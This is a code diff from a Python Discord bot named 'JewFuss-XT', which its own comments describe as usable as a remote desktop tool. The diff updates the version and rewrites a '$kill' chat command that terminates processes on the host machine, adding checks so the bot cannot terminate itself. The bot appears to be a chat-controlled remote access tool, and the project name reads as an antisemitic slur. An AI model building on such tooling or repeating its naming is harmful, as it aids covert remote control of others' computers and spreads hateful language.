@@ -53,7 +53,7 @@ import os
 import re
 
 TOKEN = "bot token" # Do not remove or modify this comment (easy compiler looks for this) - 23r98h
-version = "1.0.9.1" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
+version = "1.0.9.2" # Replace with current JewFuss-XT version (easy compiler looks for this to check for updates, so DO NOT MODIFY THIS COMMENT) - 25c75g
 USE_TRAY_ICON = False # Enables Tray icon allowing you to exit the bot on the desktop easily, used for testing or if used as a remote desktop tool | Default: False - 28f93g
 
 intents = discord.Intents.all()
@@ -2694,38 +2694,129 @@ async def tasks(ctx):
 async def kill(ctx, arg: str = ""):
     if arg == "" or not arg:
         await ctx.send("Please enter a task to be terminated")
+        return
     try:
         pid = int(arg)
+        if pid == os.getpid():
+            await ctx.send(f"{arg} matched the bot process, please use `$estop` instead to close the bot.")
+            return
         process = psutil.Process(pid)
-        process.terminate() 
+        try:
+            if os.path.normcase(os.path.abspath(process.exe())) == os.path.normcase(os.path.abspath(sys.executable)):
+                await ctx.send(f"{arg} matched the bot process, please use `$estop` instead to close the bot.")
+                return
+        except Exception:
+            pass
+        process.terminate()
         await ctx.send(f"Task with PID {pid} has been terminated!")
+        return
+
     except ValueError:
-        
+        arg_norm = arg.lower().rstrip(".exe")
+
         terminated = 0
-        firstProcName = "None"
+        self_matched = False
+        seenExactName = None
+        seenPrefixName = None
+
+        self_pid = os.getpid()
+        self_exe = os.path.normcase(os.path.abspath(sys.executable))
+        argv0_abs = os.path.normcase(os.path.abspath(sys.argv[0]))
+        argv0_base = os.path.basename(sys.argv[0]).lower()
+
         for proc in psutil.process_iter(['pid', 'name']):
-            if proc.info['name'].lower().rstrip(".exe") == arg.lower().rstrip(".exe"):
+            try:
+                name = (proc.info.get('name') or "")
+                if not name:
+                    continue
+                name_norm = name.lower().rstrip(".exe")
+
+                if name_norm == arg_norm and seenExactName is None:
+                    seenExactName = name
+
+                if name_norm != arg_norm:
+                    continue
+
+                if proc.pid == self_pid:
+                    self_matched = True
+                    continue
+
                 try:
+                    if os.path.normcase(os.path.abspath(proc.exe())) == self_exe:
+                        self_matched = True
+                        continue
+                except Exception:
+                    pass
+
+                try:
+                    cmd = proc.cmdline() or []
+                    if argv0_abs and any(os.path.normcase(os.path.abspath(x)) == argv0_abs for x in cmd if x):
+                        self_matched = True
+                        continue
+                    if argv0_base and any(os.path.basename(x).lower() == argv0_base for x in cmd if x):
+                        self_matched = True
+                        continue
+                except Exception:
+                    pass
+
+                psutil.Process(proc.info['pid']).terminate()
+                terminated += 1
+            except psutil.NoSuchProcess:
+                pass
+            except Exception:
+                pass
+
+        if terminated <= 0:
+            for proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    name = (proc.info.get('name') or "")
+                    if not name:
+                        continue
+                    name_norm = name.lower().rstrip(".exe")
+
+                    if name_norm.startswith(arg_norm) and seenPrefixName is None:
+                        seenPrefixName = name
+
+                    if not name_norm.startswith(arg_norm):
+                        continue
+
+                    if proc.pid == self_pid:
+                        self_matched = True
+                        continue
+
+                    try:
+                        if os.path.normcase(os.path.abspath(proc.exe())) == self_exe:
+                            self_matched = True
+                            continue
+                    except Exception:
+                        pass
+
+                    try:
+                        cmd = proc.cmdline() or []
+                        if argv0_abs and any(os.path.normcase(os.path.abspath(x)) == argv0_abs for x in cmd if x):
+                            self_matched = True
+                            continue
+                        if argv0_base and any(os.path.basename(x).lower() == argv0_base for x in cmd if x):
+                            self_matched = True
+                            continue
+                    except Exception:
+                        pass
+
                     psutil.Process(proc.info['pid']).terminate()
-                    firstProcName = proc.info['name']
                     terminated += 1
                 except psutil.NoSuchProcess:
                     pass
-    
-        if terminated <= 0:
-            for proc in psutil.process_iter(['pid', 'name']):
-                if proc.info['name'].lower().rstrip(".exe").startswith(arg.lower().rstrip(".exe")):
-                    try:
-                        psutil.Process(proc.info['pid']).terminate()
-                        firstProcName = proc.info['name']
-                        terminated += 1
-                    except psutil.NoSuchProcess:
-                        pass    
-        
-        if terminated > 0:
+                except Exception:
+                    pass
+
+        if terminated == 0 and self_matched:
+            await ctx.send(f"{arg} matched the bot process, please use `$estop` instead to close the bot.")
+        elif terminated > 0:
             await ctx.send(f"Terminated **{terminated}** processes with the name `{arg}`")
         else:
-            await ctx.send(f"No processes with the name `{firstProcName}` found.")
+            closest = seenExactName or seenPrefixName or arg
+            await ctx.send(f"No processes with the name `{closest}` found.")
+
     except Exception as e:
         await ctx.send(f"Error terminating task: {str(e)}")
 
